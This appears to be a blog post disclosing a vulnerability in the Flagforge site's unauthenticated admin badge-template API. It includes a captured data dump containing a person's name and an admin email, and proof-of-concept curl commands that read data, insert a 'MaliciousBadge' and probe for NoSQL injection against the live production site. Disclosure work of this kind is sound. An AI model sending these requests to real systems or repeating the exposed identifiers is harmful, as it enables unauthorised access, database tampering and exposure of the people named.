---
title: "Report 🐈‍⬛"
date: 2025-11-13T15:00:00+05:45
draft: false
tags: ["Web Hacking", "CVEs"]
---

This is a short description of the post. <!--more-->



# Message : Read the disclaimer in the POC section.
# Vulnerability Report: Unauthenticated Access to Flagforge Admin API Endpoints

## Summary
The Flagforge application (`https://flagforge.xyz`) exposes critical vulnerabilities in its administrative API endpoints, specifically `/api/admin/badge-templates` (GET) and `/api/admin/badge-templates/create` (POST). Both endpoints lack authentication and authorization controls, allowing unauthenticated users to retrieve sensitive badge template data and create arbitrary templates in the MongoDB database. This could lead to unauthorized data exposure, database pollution, or abuse of the badge system (e.g., creating malicious or spam templates).

## Description
### Affected Endpoints
1. **GET `/api/admin/badge-templates`**:
   - Returns a JSON array of all badge templates stored in the MongoDB `badgeTemplates` collection.
   - Exposed fields include `_id`, `name`, `description`, `icon`, `color`, `isActive`, `createdBy`, `createdAt`, `updatedAt`, and `__v`.
   - No authentication headers, API keys, or session checks are required, making the endpoint publicly accessible.
   - Sample response (from cURL):
```bash
>>curl -i https://flagforge.xyz/api/admin/badge-templates
HTTP/2 200
access-control-allow-origin: https://flagforge.xyz
age: 0
cache-control: no-store, no-cache, must-revalidate, proxy-revalidate
content-type: application/json
date: Sat, 27 Sep 2025 11:17:35 GMT
permissions-policy: geolocation=(), microphone=(), camera=(), payment=()
pragma: no-cache
referrer-policy: no-referrer
server: Vercel
strict-transport-security: max-age=31536000; includeSubDomains; preload
vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
x-content-type-options: nosniff
x-frame-options: DENY
x-matched-path: /api/admin/badge-templates
x-vercel-cache: MISS
x-vercel-id: bom1::iad1::kbnlf-1758971855497-e981648f08c6
x-xss-protection: 1; mode=block

{"success":true,"templates":[{"_id":"68d18c6b3ddde4c2825273a1","name":"Staff","description":"Awarded for behind-the-scenes work that powers the community forward.","icon":"/badges/images/badge-1758563431839-63u7vxws5u.png","color":"#8B5CF6","isActive":true,"createdBy":"Lagzen Thakuri","createdAt":"2025-09-22T17:50:35.138Z","updatedAt":"2025-09-22T17:50:35.138Z","__v":0},{"_id":"68d18c073ddde4c282527398","name":"Bug Hunter","description":"Awarded for sharp eyes and a hacker’s mindset in finding weaknesses.","icon":"/badges/images/badge-1758563324750-h7zfukwxw7.png","color":"#8B5CF6","isActive":true,"createdBy":"Lagzen Thakuri","createdAt":"2025-09-22T17:48:55.675Z","updatedAt":"2025-09-22T17:48:55.675Z","__v":0},{"_id":"68ccfd395b3791025b51c200","name":"Security Researcher","description":"Earned by pushing boundaries and digging deeper into security.","icon":"/badges/custom/badge-1758264629375-0y4fdhdxjy5.png","color":"#8B5CF6","isActive":true,"createdBy":"admin@flagforge.com","createdAt":"2025-09-19T06:50:33.108Z","updatedAt":"2025-09-19T06:50:33.108Z","__v":0}],"count":3}%           
```
     

1. **POST `/api/admin/badge-templates/create`**:
   - Allows creation of new badge templates with user-controlled fields: `name`, `description`, `icon`, `color`, `isActive`, and `createdBy`.
   - Minimal validation checks for presence of `name`, `description`, and `icon`, and ensures no duplicate `name` exists.
   - No authentication or authorization checks, enabling anyone to insert data into the database.
   - Sample code (from provided source):
```javascript
     const templateDoc = {
       name: name.trim(),
       description: description.trim(),
       icon: icon.trim(),
       color: color || '#8B5CF6',
       isActive: isActive !== undefined ? isActive : true,
       createdAt: new Date(),
       createdBy: createdBy || 'unknown'
     };
     const result = await db.collection('badgeTemplates').insertOne(templateDoc);
 ```

### Weaknesses
- **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** (GET endpoint): Exposes user identifiers (e.g., `Lagzen Thakuri`, `admin@flagforge.com`) and metadata, enabling reconnaissance or phishing.
- **CWE-306: Missing Authentication for Critical Function** (both endpoints): No access controls on administrative routes.
- **CWE-284: Improper Access Control** (both endpoints): Allows unauthorized data retrieval and modification.
- **Potential NoSQL Injection**: While the POST endpoint explicitly destructures fields, the GET endpoint may be vulnerable if it supports query parameters (e.g., `?name[$ne]=test`).
- **Log Pollution Risk**: The POST endpoint logs user-controlled `name` and `createdBy`, which could be abused for log spam or injection.

### CVSS v3.1 Score
- **Base Score**: 9.1 (Critical)
- **Vector**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`
  - **Attack Vector (AV)**: Network (publicly accessible endpoints).
  - **Attack Complexity (AC)**: Low (no special conditions required).
  - **Privileges Required (PR)**: None (no authentication needed).
  - **User Interaction (UI)**: None (direct HTTP requests).
  - **Scope (S)**: Unchanged (affects the application itself).
  - **Confidentiality (C)**: High (exposes user data).
  - **Integrity (I)**: High (allows arbitrary data creation).
  - **Availability (A)**: Low (potential DoS via mass template creation).

## Affected Systems
- **Application**: Flagforge (`https://flagforge.xyz`)
- **Components**:
  - Next.js API routes: `/api/admin/badge-templates` (GET) and `/api/admin/badge-templates/create` (POST).
  - MongoDB database: `badgeTemplates` collection.
- **Hosting**: Vercel (serverless, inferred from `server: Vercel` header).
- **Versions**: Unknown (assumed Next.js 13+ based on `NextRequest`/`NextResponse` syntax).
- **Dependencies**: MongoDB driver (via custom `@/utlis/db` connect utility), Next.js.

## Impact
- **Confidentiality**: Exposure of user identifiers (`createdBy`) and metadata (`createdAt`, `updatedAt`), which could be used for social engineering or targeted attacks.
- **Integrity**: Unauthorized creation of badge templates, potentially leading to spam, phishing, or malicious content display in the application.
- **Availability**: Potential denial-of-service (DoS) by flooding the POST endpoint with template creations, consuming database resources.
- **Exploitability**: High, as the endpoints are publicly accessible via simple HTTP requests (e.g., cURL, Postman) with no authentication barriers.

## Proof of Concept
1. **Retrieve Sensitive Data (GET)**:
   ```
   curl https://flagforge.xyz/api/admin/badge-templates
   ```
   - Returns a JSON list of all badge templates, including sensitive fields like `createdBy` (e.g., `admin@flagforge.com`).


**Disclaimer** : Well this post method and another method which is delete method can be done but these both are still haven't been check my be because of the lack of authorization so i would like to ask the admin the to test this thing in the development site because in the test site we don't have the database connected so it's not working on that so i had to test thing on the main site. I would like to tell the authorities to test these on that.


2. **Create Unauthorized Template (POST)**:
   ```
   curl -X POST https://flagforge.xyz/api/admin/badge-templates/create \
     -H "Content-Type: application/json" \
     -d '{"name":"MaliciousBadge","description":"Hacked","icon":"evil.svg","createdBy":"attacker"}'
   ```
   - Creates a new template in the `badgeTemplates` collection.
   - Verify by re-running the GET request to confirm the new template appears.
3. **Potential NoSQL Injection (GET, if query parameters are supported)**:
   ```
   curl https://flagforge.xyz/api/admin/badge-templates?name[$regex]=.*
   ```
   - Test if the endpoint processes MongoDB operators, which could bypass filters or expose additional data.

## Recommendations
### Immediate Fixes
1. **Implement Authentication**:
   - Add middleware to verify user identity (e.g., JWT, NextAuth.js, or API keys) for both endpoints.
     ```typescript
     // Example middleware for POST endpoint
     export async function POST(request: NextRequest) {
       const authHeader = request.headers.get('authorization');
       if (!authHeader || !verifyToken(authHeader)) { // Implement verifyToken
         return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
       }
       // ... existing code ...
     }
     ```
2. **Restrict GET Endpoint**:
   - Limit the GET endpoint to authenticated admins or return minimal data (e.g., exclude `createdBy`).
   - If query parameters are supported, sanitize inputs to prevent NoSQL injection.

## References
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- CVSS v3.1 Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator